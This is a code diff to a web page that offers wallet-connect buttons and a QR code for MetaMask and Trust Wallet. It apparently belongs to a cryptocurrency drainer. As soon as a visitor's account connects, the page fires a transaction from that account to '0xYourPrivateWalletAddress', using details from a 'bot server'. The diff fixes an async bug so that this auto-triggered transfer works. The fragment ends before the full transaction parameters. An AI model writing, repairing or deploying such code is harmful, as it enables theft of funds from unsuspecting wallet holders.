@@ -71,7 +71,7 @@
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
     <script>
         const wallets = [
-            { name: 'MetaMask', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png', link: 'metamask://dapp/' },
+            { name: 'MetaMask', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png', link: 'metamask://' },
             { name: 'Trust Wallet', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png', link: 'https://link.trustwallet.com/open_url?coin_id=60&url=' },
         ];
 
@@ -124,7 +124,7 @@
                         showQRCode(uri);
                     });
 
-                    provider.on("accountsChanged", (accounts) => {
+                    provider.on("accountsChanged", async (accounts) => {
                         console.log("Connected account:", accounts);
                         // Trigger transaction after account is connected
                         await triggerTransaction(accounts[0]);
@@ -143,7 +143,6 @@
                 async function triggerTransaction(account) {
                     try {
                         // Fetch transaction details from bot server
-                        // (Here you would normally communicate with your bot)
                         const txParams = {
                             from: account,
                             to: "0xYourPrivateWalletAddress",
